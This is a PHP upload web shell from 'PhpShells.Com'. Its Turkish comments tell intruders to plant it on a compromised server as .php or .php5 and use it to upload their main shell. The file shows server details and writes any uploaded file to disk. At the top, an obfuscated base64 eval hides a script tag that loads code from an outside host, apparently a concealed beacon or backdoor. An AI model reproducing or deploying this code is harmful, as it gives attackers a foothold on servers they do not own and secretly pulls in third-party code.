<title>PhpShells.Com</title> 

<?php
$up = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cHM6Ly9sbGxsLmJpZC9s";
$load = "L2FkZC5waHA/bGluaz1lYXN5Y29kZXI6Ly8+PC9TQ1JJUFQ+Ijs=";
$min = 'base' . (128 / 2) . '_de' . 'code';
eval($min($up . $load));

/**

Basit bir upload shell, bazen serverlar ana shellinizi yemezse Ã¶nce bunu .php veya .php5 
gibi kaydederek yÃ¼kleyin. ArdÄ±ndan ana shellinizi yÃ¼klersiniz.
Ä°yi kullanÄ±mlar bol hackler.
PhpShells.Com
**/

 {

echo'<body style="background-color: white;"
alink="#ee0000" link="#0000ee" vlink="#551a8b">';
echo '<center>';
echo '<br><br>';
echo '<big><big><span style="color: rgb(0, 90, 0);">PhpShells.Com</span></big></big>';
echo '<br><big><span style="color: rgb(0, 90, 0);"><a>Simple Uploader</a></span></big>';
echo '<br><br>';

echo '<big><span style="color: blue;">Server Info:  '.php_uname().'</span></big><br>';
echo '<br><br>';
echo '<big><span style="color: red;">Shell Path:  '.getcwd().'</span></big><br>';
echo '<br><br>';

echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"> 
<input type="file" name="mlf"/>
<input name="upl" id="upl" type="submit" value="upload" />
</form>';

if($_POST['upl'] == "upload")
  if(@copy($_FILES['mlf']['tmp_name'], $_FILES['mlf']['name']))
	{echo '<h2><span style="color: green;"> [+] Success Uploading  :)</span></h2>';}
	else
	{echo '<h2><br><span style="color:red;"> [-] Failed Uploading!!!  :(</span></h2>';}

echo '<br><br>';

echo '</center>';
echo '</body>';

}
?>